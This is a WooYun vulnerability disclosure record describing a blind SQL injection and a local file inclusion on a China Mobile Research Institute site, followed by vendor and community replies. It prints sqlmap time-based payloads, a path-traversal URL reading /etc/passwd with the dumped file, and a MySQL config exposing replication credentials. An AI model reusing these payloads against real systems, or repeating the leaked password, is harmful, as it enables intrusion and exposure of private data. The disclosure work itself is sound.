{"id": 48111, "wybug_id": "wooyun-2014-084165", "wybug_title": "中国移动研究院SQL盲注+本地文件包含", "wybug_corp": "中国移动", "wybug_author": "pandada", "wybug_date": "2014-11-22 09:43", "wybug_open_date": "2015-01-06 09:44", "wybug_type": "重要敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-06：\t细节向公众公开  简要描述： SQL盲注+本地文件包含。如果可以请给高点分以示鼓励！嘿嘿！ 详细说明：  注入点实在是太多，我挑了一处作为演示：星号部分为注入点\nGET /events/share/index.php?category=&domain=10313&i=40&order=*&q=share&uid=0 HTTP/1.1X-Requested-With: XMLHttpRequestReferer: http://labs.chinamobile.com:80/Cookie: PHPSESSID=a35a48f4736395e3d17d836ef26690bf; errorsNum=1; returnUrl=%2Fgroups%2F10164; hd_sid=ERqHvU; n2rE_2132_saltkey=vKtey6mz; n2rE_2132_sid=rG46KJHost: labs.chinamobile.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*\n   漏洞证明：  盲注实在是慢，部分信息如下：\nsqlmap identified the following injection points with a total of 1269 HTTP(s) requests:---Place: URIParameter: #1*    Type: AND/OR time-based blind    Title: MySQL >= 5.0 time-based blind - Parameter replace    Payload: http://labs.chinamobile.com:80/events/share/index.php?category=&domain=10313&i=40&order=(SELECT (CASE WHEN (6027=6027) THEN SLEEP(5) ELSE 6027*(SELECT 6027 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&q=share&uid=0---web application technology: Nginx, PHP 5.2.17back-end DBMS: MySQL 5.0current user:    '6D6F62696C656875625F736C617665403539312'current database:    'mobilehu'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: AND/OR time-based blind    Title: MySQL >= 5.0 time-based blind - Parameter replace    Payload: http://labs.chinamobile.com:80/events/share/index.php?category=&domain=10313&i=40&order=(SELECT (CASE WHEN (6027=6027) THEN SLEEP(5) ELSE 6027*(SELECT 6027 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&q=share&uid=0---web application technology: Nginx, PHP 5.2.17back-end DBMS: MySQL >= 5.0.0current user:    '6D6F62696C656875625F736C617665403539312'current database:    'mobilehu'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: AND/OR time-based blind    Title: MySQL >= 5.0 time-based blind - Parameter replace    Payload: http://labs.chinamobile.com:80/events/share/index.php?category=&domain=10313&i=40&order=(SELECT (CASE WHEN (6027=6027) THEN SLEEP(5) ELSE 6027*(SELECT 6027 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&q=share&uid=0---web application technology: Nginx, PHP 5.2.17back-end DBMS: MySQL >= 5.0.0available databases [3]:[*] `696E666F726D6174696`[*] `6`[*] B\n速度不给力，很多内容不完整，见谅。本地文件包含：http://labs.chinamobile.com/report/uploaddown.php?path=/../../../../../../etc/passwd\nroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologinabrt:x:173:173::/etc/abrt:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinsaslauth:x:499:76:\"Saslauthd user\":/var/empty/saslauth:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologintcpdump:x:72:72::/:/sbin/nologinoprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologinmailnull:x:47:47::/var/spool/mqueue:/sbin/nologinsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologinmysql:x:27:27::/dev/null:/sbin/nologinwww:x:1000:1000::/dev/null:/sbin/nologinwdcpu:x:999:999::/www/wdlinux/wdcp:/sbin/nologin\n数据库配置文件信息\n# mysql conf /etc/my.cnf# Created by http://www.wdlinux.cn# Last Updated 2010.06.01[client]port\t\t= 3306socket\t\t= /tmp/mysql.sock[mysqld]slave_skip_errors = 1062#skip-innodbport\t\t= 3306socket\t\t= /tmp/mysql.sockskip-external-lockingkey_buffer_size = 128Mmax_allowed_packet = 512Mtable_open_cache = 256sort_buffer_size = 1Mread_buffer_size = 1Mread_rnd_buffer_size = 2Mmyisam_sort_buffer_size = 8Mthread_cache_size = 8query_cache_size= 16Mthread_concurrency = 8max_connections = 1000wait_timeout = 30interactive_timeout = 300max_connect_errors = 9long_query_time = 1tmp_table_size = 16M#log-bin=mysql-bin#binlog_format=mixedserver-id\t= 233master-host=192.168.0.231master-user=repmaster-password=etentec@etentecmaster-port=3306replicate-ignore-db=wdcpdbreplicate-ignore-db=testreplicate-ignore-db=mysql[mysqldump]quickmax_allowed_packet = 128M[mysql]no-auto-rehash[myisamchk]key_buffer_size = 12Msort_buffer_size = 1Mread_buffer = 1Mwrite_buffer = 1M[mysqlhotcopy]interactive-timeout\n   修复方案：  赶紧全面排查，问题还是很多的   版权声明：转载请注明来源 pandada@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-11-26 15:47 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-22 10:48 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:550 漏洞数:52        )\t\t \n  no shell no rank    \n     2014-11-22 11:30 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n   WooYun: 中国移动研究院任意文件读取及sql注入 重复了吧？    \n     2014-11-22 11:35 |    \t\tpandada \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:20        | To be a warrior is not a simple matter o...)\t\t \n  @menmen519 不是同一个地方，我看了所有提交的关于移动研究院的漏洞，没有重复    \n     2014-11-22 11:36 |    \t\tpandada \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:20        | To be a warrior is not a simple matter o...)\t\t \n  @loli 求带    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}